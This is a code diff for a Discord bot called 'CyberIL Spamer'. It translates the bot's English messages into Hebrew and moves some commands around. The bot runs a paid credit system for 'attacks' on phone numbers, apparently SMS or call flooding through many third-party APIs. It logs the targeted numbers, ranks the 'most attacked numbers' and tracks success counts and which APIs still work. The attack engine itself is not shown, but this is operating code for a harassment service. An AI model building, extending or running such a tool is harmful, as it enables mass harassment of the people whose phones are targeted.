-@app_commands.describe(member="Target user")
+@tree.command(name="removelifetime", description="[ADMIN] הסר קרדיטים ללא הגבלה")
+@app_commands.describe(member="משתמש יעד")
 async def cmd_removelifetime(interaction: discord.Interaction, member: discord.Member):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     await interaction.response.defer()
     await set_unlimited(member.id, False)
-    embed = discord.Embed(title="♾️ Lifetime Removed", description=f"{member.mention} no longer has lifetime.", color=COLOR_WARNING)
+    embed = discord.Embed(title="♾️ Lifetime הוסר", description=f"{member.mention} איבד את ה-lifetime", color=COLOR_WARNING)
     await interaction.followup.send(embed=embed)
 
-@tree.command(name="freecredits", description="[ADMIN] Post the free credits gift message")
+@tree.command(name="freecredits", description="[ADMIN] שלח הודעת קרדיטים חינם")
 async def cmd_freecredits(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     embed = discord.Embed(
-        title="CyberIL Spamer | Free Coins",
-        description="**Free Coins**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
+        title="🎁 **קרדיטים חינם** 🎁",
+        description="**קבל קרדיט אחד כל 24 שעות**\n\nלחץ על הכפתור למטה כדי לקבל קרדיט",
         color=0xFFD700
     )
     embed.set_footer(text="CyberIL Spamer © 2026")
     await interaction.response.send_message(embed=embed, view=FreeCoins())
 
-@tree.command(name="giveall", description="[ADMIN] Give credits to everyone")
-@app_commands.describe(amount="Amount to give to all users")
+@tree.command(name="giveall", description="[ADMIN] תן קרדיטים לכל המשתמשים")
+@app_commands.describe(amount="כמות לתת לכולם")
 async def cmd_giveall(interaction: discord.Interaction, amount: int):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
     if amount <= 0:
-        await interaction.followup.send("❌ Must be positive.", ephemeral=True)
+        await interaction.followup.send("❌ כמות חייבת להיות חיובית", ephemeral=True)
         return
     await users_collection.update_many({}, {"$inc": {"credits": amount}})
-    await interaction.followup.send(f"✅ Gave **{amount}** credits to everyone!", ephemeral=True)
+    await interaction.followup.send(f"✅ ניתנו **{amount}** קרדיטים לכולם!", ephemeral=True)
 
-@tree.command(name="checkcredit", description="[ADMIN] Check balance of a specific user")
-@app_commands.describe(member="User to check")
-async def cmd_checkcredit(interaction: discord.Interaction, member: discord.Member):
-    if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
-        return
-    await interaction.response.defer(ephemeral=True)
-    bal = await format_balance(member.id)
-    stats = await get_user_stats(member.id)
-
-    embed = discord.Embed(title="💳 Wallet Info (Admin View)", color=COLOR_MAIN)
-    embed.add_field(name="User:", value=member.mention, inline=True)
-    embed.add_field(name="Current Balance:", value=f"**{bal}**", inline=True)
-    if stats:
-        embed.add_field(name="Total Attacks", value=str(stats.get("total_attacks", 0)), inline=True)
-        embed.add_field(name="Total Success", value=str(stats.get("total_success", 0)), inline=True)
-        embed.add_field(name="Total Failed", value=str(stats.get("total_failed", 0)), inline=True)
-
-    embed.set_footer(text=f"Requested by {interaction.user.name}")
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="transfercredit", description="Transfer credits to another user (min 20)")
-@app_commands.describe(member="Recipient", amount="Amount to transfer (min 20)")
+@tree.command(name="transfer", description="העבר קרדיטים למשתמש אחר (מינימום 20)")
+@app_commands.describe(member="מקבל", amount="כמות להעברה (מינימום 20)")
 async def cmd_transfer(interaction: discord.Interaction, member: discord.Member, amount: int):
     await interaction.response.defer(ephemeral=True)
     if amount < 20:
-        await interaction.followup.send("❌ Minimum transfer is **20** credits.", ephemeral=True)
+        await interaction.followup.send("❌ מינימום העברה הוא **20** קרדיטים", ephemeral=True)
         return
     if interaction.user.id == member.id:
-        await interaction.followup.send("❌ You can't transfer to yourself.", ephemeral=True)
+        await interaction.followup.send("❌ אי אפשר להעביר לעצמך", ephemeral=True)
         return
 
     uid = interaction.user.id
     if await has_unlimited(uid):
-        await interaction.followup.send("❌ Lifetime users cannot transfer credits.", ephemeral=True)
+        await interaction.followup.send("❌ משתמשי lifetime לא יכולים להעביר קרדיטים", ephemeral=True)
         return
 
     bal = await fetch_balance(uid)
     if bal < amount:
-        await interaction.followup.send(f"❌ Not enough credits. You have **{bal}**.", ephemeral=True)
+        await interaction.followup.send(f"❌ אין מספיק קרדיטים. יש לך **{bal}**", ephemeral=True)
         return
 
     await remove_credits(uid, amount)
     await add_credits(member.id, amount)
 
-    embed = discord.Embed(title="💸 Transfer Complete", color=COLOR_SUCCESS)
-    embed.add_field(name="From", value=interaction.user.mention, inline=True)
-    embed.add_field(name="To", value=member.mention, inline=True)
-    embed.add_field(name="Amount", value=f"**{amount}** credits", inline=True)
+    embed = discord.Embed(title="💸 העברה הושלמה", color=COLOR_SUCCESS)
+    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
+    embed.add_field(name="אל", value=member.mention, inline=True)
+    embed.add_field(name="כמות", value=f"**{amount}** קרדיטים", inline=True)
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="restart", description="[ADMIN] Restart the bot")
+@tree.command(name="mylogs", description="הצג את לוגי הספאם שלך")
+async def cmd_mylogs(interaction: discord.Interaction):
+    await interaction.response.defer(ephemeral=True)
+    logs = await get_user_logs(interaction.user.id, 10)
+
+    if not logs:
+        await interaction.followup.send("📭 אין לך מתקפות עדיין", ephemeral=True)
+        return
+
+    embed = discord.Embed(title="📋 **לוגי הספאם שלי**", color=COLOR_INFO)
+    for log in logs:
+        embed.add_field(
+            name=f"{log['date']} {log['time']}",
+            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
+            inline=False
+        )
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+@tree.command(name="restart", description="[ADMIN] הפעל מחדש את הבוט")
 async def cmd_restart(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
-    await interaction.response.send_message("🔄 Restarting...", ephemeral=True)
+    await interaction.response.send_message("🔄 מאתחל...", ephemeral=True)
     await client.close()
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
-@tree.command(name="checkstatus", description="[ADMIN] Check how many APIs are working")
+@tree.command(name="checkstatus", description="[ADMIN] בדוק אילו APIs עובדים")
 async def cmd_checkstatus(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
 
     await interaction.response.defer(ephemeral=True)
@@ -1150,34 +1000,36 @@ async def cmd_checkstatus(interaction: discord.Interaction):
     success, failed = await run_all(test_num)
     total = success + len(failed)
 
-    embed = discord.Embed(title="📊 API Check Results", color=COLOR_INFO)
-    embed.add_field(name="✅ Working", value=str(success), inline=True)
-    embed.add_field(name="❌ Failed", value=str(len(failed)), inline=True)
-    embed.add_field(name="🔢 Total Checked", value=str(total), inline=True)
+    embed = discord.Embed(title="📊 **בדיקת APIs**", color=COLOR_INFO)
+    embed.add_field(name="✅ עובדים", value=str(success), inline=True)
+    embed.add_field(name="❌ נכשלו", value=str(len(failed)), inline=True)
+    embed.add_field(name="🔢 סה\"כ", value=str(total), inline=True)
 
     if failed:
-        failed_str = ", ".join(failed)
+        failed_str = ", ".join(failed[:10])
+        if len(failed) > 10:
+            failed_str += f"... ועוד {len(failed)-10}"
         if len(failed_str) > 1024:
             failed_str = failed_str[:1020] + "..."
-        embed.add_field(name="Failed APIs:", value=failed_str, inline=False)
+        embed.add_field(name="APIs שנכשלו:", value=failed_str, inline=False)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="attacklogs", description="[ADMIN] View recent attack logs")
-@app_commands.describe(limit="Number of logs to show (1-50)")
+@tree.command(name="attacklogs", description="[ADMIN] הצג לוגי ספאם אחרונים")
+@app_commands.describe(limit="כמות לוגים להצגה (1-50)")
 async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
 
     await interaction.response.defer(ephemeral=True)
     logs = await get_all_logs(min(limit, 50))
 
     if not logs:
-        await interaction.followup.send("📭 No logs yet.", ephemeral=True)
+        await interaction.followup.send("📭 אין לוגים עדיין", ephemeral=True)
         return
 
-    embed = discord.Embed(title="📋 Recent Attack Logs", color=COLOR_INFO)
+    embed = discord.Embed(title="📋 **לוגי ספאם אחרונים**", color=COLOR_INFO)
     for log in logs[:10]:
         embed.add_field(
             name=f"{log['username']} | {log['date']} {log['time']}",
@@ -1186,72 +1038,53 @@ async def cmd_attacklogs(interaction: discord.Interaction, limit: int = 10):
         )
 
     if len(logs) > 10:
-        embed.set_footer(text=f"+ {len(logs) - 10} more logs")
+        embed.set_footer(text=f"+ {len(logs) - 10} לוגים נוספים")
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="topnumbers", description="[ADMIN] Most attacked numbers")
+@tree.command(name="topnumbers", description="[ADMIN] המספרים המותקפים ביותר")
 async def cmd_topnumbers(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
 
     await interaction.response.defer(ephemeral=True)
     top = await get_top_targets(10)
 
     if not top:
-        await interaction.followup.send("📭 No data yet.", ephemeral=True)
+        await interaction.followup.send("📭 אין נתונים עדיין", ephemeral=True)
         return
 
-    embed = discord.Embed(title="🎯 Most Attacked Numbers", color=COLOR_INFO)
+    embed = discord.Embed(title="🎯 **המספרים המותקפים ביותר**", color=COLOR_INFO)
     for i, item in enumerate(top, 1):
         embed.add_field(
             name=f"{i}. {item['_id']}",
-            value=f"Attacks: {item['count']} | Success: {item['success_total']}",
+            value=f"מתקפות: {item['count']} | הצלחות: {item['success_total']}",
             inline=False
         )
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="globalstats", description="[ADMIN] Global statistics")
+@tree.command(name="globalstats", description="[ADMIN] סטטיסטיקות גלובליות")
 async def cmd_globalstats(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ הרשאות חסרות", ephemeral=True)
         return
 
     await interaction.response.defer(ephemeral=True)
     stats = await get_global_stats()
 
     if not stats:
-        await interaction.followup.send("📭 No data yet.", ephemeral=True)
+        await interaction.followup.send("📭 אין נתונים עדיין", ephemeral=True)
         return
 
-    embed = discord.Embed(title="📊 Global Statistics", color=COLOR_INFO)
-    embed.add_field(name="🎯 Total Attacks", value=str(stats.get("total_attacks", 0)), inline=True)
-    embed.add_field(name="👥 Unique Users", value=str(stats.get("unique_users", 0)), inline=True)
-    embed.add_field(name="💎 Credits Used", value=str(stats.get("total_cost", 0)), inline=True)
-    embed.add_field(name="✅ Total Success", value=str(stats.get("total_success", 0)), inline=True)
-    embed.add_field(name="❌ Total Failed", value=str(stats.get("total_failed", 0)), inline=True)
-    embed.add_field(name="📨 Total Requests", value=str(stats.get("total_requests", 0)), inline=True)
-
-    await interaction.followup.send(embed=embed, ephemeral=True)
-
-@tree.command(name="mylogs", description="View your attack logs")
-async def cmd_mylogs(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    logs = await get_user_logs(interaction.user.id, 10)
-
-    if not logs:
-        await interaction.followup.send("📭 You have no attacks yet.", ephemeral=True)
-        return
-
-    embed = discord.Embed(title="📋 Your Attack Logs", color=COLOR_INFO)
-    for log in logs:
-        embed.add_field(
-            name=f"{log['date']} {log['time']}",
-            value=f"📱 {log['phone']}\n✅ {log['success_count']} | ❌ {log['failed_count']} | 💎 {log['cost']}",
-            inline=False
-        )
+    embed = discord.Embed(title="📊 **סטטיסטיקות גלובליות**", color=COLOR_INFO)
+    embed.add_field(name="🎯 סה\"כ מתקפות", value=str(stats.get("total_attacks", 0)), inline=True)
+    embed.add_field(name="👥 משתמשים ייחודיים", value=str(stats.get("unique_users", 0)), inline=True)
+    embed.add_field(name="💎 קרדיטים בשימוש", value=str(stats.get("total_cost", 0)), inline=True)
+    embed.add_field(name="✅ סה\"כ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
+    embed.add_field(name="❌ סה\"כ כשלונות", value=str(stats.get("total_failed", 0)), inline=True)
+    embed.add_field(name="📨 סה\"כ בקשות", value=str(stats.get("total_requests", 0)), inline=True)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
